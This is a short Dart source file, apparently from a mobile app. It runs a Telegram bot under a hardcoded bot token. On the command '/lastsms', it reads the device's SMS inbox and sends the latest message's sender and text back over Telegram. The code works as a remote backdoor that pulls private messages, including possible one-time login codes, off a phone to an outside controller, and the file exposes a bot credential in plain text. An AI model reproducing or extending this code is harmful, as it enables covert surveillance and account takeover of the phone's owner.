import 'package:teledart/teledart.dart';
import 'package:teledart/telegram.dart';
import 'package:telephony/telephony.dart';

void mainbd() async {
  var botToken = '5470940231:AAFQCuXUjhWgB6Mkzobm6yFtcdWMx92JN68';
  final username = (await Telegram(botToken).getMe()).username;
  var teledart = TeleDart(botToken, Event(username!));
  final Telephony telephony = Telephony.instance;

  teledart.start();

  teledart.onCommand('lastsms').listen(
    (message) async {
      List<SmsMessage> messages = await telephony.getInboxSms(
        columns: [SmsColumn.ADDRESS, SmsColumn.BODY],
      );
      dynamic m;
      for (m in messages) {
        message.reply(m.address + "\n" + m.body);
        break;
      }
    },
  );
}
